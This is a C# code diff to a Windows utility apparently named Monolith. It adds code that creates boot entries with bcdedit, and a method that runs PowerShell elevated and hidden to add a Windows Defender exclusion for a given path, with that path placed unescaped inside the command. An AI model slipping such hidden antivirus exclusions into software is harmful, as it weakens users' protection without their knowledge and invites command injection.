@@ -13,39 +13,24 @@ namespace Monolith.Classes
     {
         public static readonly string ExtractionPath = Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Monolith", "ExtractedFiles");
 
-        public static void ConfigureBootloader(string systemDrive, string entryName, bool defaultEntry)
+        public static void AddFileExclusion(string filePath)
         {
-            string newBootGuid = null;
-            var output = RunCommand("bcdedit", "/enum");
-
-            for (int i = 0; i < output.Count; i++)
+            ProcessStartInfo psi = new ProcessStartInfo
             {
-                string line = output[i];
+                FileName = "powershell.exe",
+                Arguments = $"-ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionProcess '{filePath}'\"",
+                Verb = "runas",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
 
-                if (line.StartsWith("device", StringComparison.OrdinalIgnoreCase) &&
-                    line.Contains($"partition={systemDrive.TrimEnd('\\')}"))
-                {
-                    for (int j = i; j >= 0; j--)
-                    {
-                        if (output[j].StartsWith("identifier", StringComparison.OrdinalIgnoreCase))
-                        {
-                            newBootGuid = output[j].Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries)[1].Trim();
-                            break;
-                        }
-                    }
-
-                    if (newBootGuid != null)
-                        break;
-                }
+            using (Process process = new Process { StartInfo = psi })
+            {
+                process.Start();
+                process.WaitForExit();
             }
-
-            if (string.IsNullOrWhiteSpace(newBootGuid))
-                throw new Exception("Failed to find the new boot entry GUID.");
-
-            RunCommand("bcdedit", $"/set {newBootGuid} description \"{entryName}\"");
-
-            if (defaultEntry)
-                RunCommand("bcdedit", $"/default {newBootGuid}");
         }
 
         public static List<string> RunCommand(string fileName, string arguments)
@@ -168,6 +153,38 @@ namespace Monolith.Classes
             };
 
             _ = await uiMessageBox.ShowDialogAsync();
+        }
+
+        public static void CreateBootEntry(string entryName, string systemDrive, bool setAsDefault = false)
+        {
+            var createOutput = RunCommand("bcdedit", $"/create /d \"{entryName}\" /application osloader");
+            
+            string guid = null;
+            foreach (var line in createOutput)
+            {
+                int startIndex = line.IndexOf('{');
+                int endIndex = line.IndexOf('}');
+                if (startIndex != -1 && endIndex != -1 && endIndex > startIndex)
+                {
+                    string potentialGuid = line.Substring(startIndex + 1, endIndex - startIndex - 1);
+                    if (Guid.TryParse(potentialGuid, out _))
+                    {
+                        guid = potentialGuid;
+                        break;
+                    }
+                }
+            }
+
+            RunCommand("bcdedit", $"/set {{{guid}}} device partition={systemDrive.TrimEnd('\\')}");
+            RunCommand("bcdedit", $"/set {{{guid}}} path \\Windows\\system32\\winload.efi");
+            RunCommand("bcdedit", $"/set {{{guid}}} osdevice partition={systemDrive.TrimEnd('\\')}");
+            RunCommand("bcdedit", $"/set {{{guid}}} systemroot \\Windows");
+            RunCommand("bcdedit", $"/displayorder {{{guid}}} /addlast");
+
+            if (setAsDefault)
+            {
+                RunCommand("bcdedit", $"/default {{{guid}}}");
+            }
         }
     }
 }
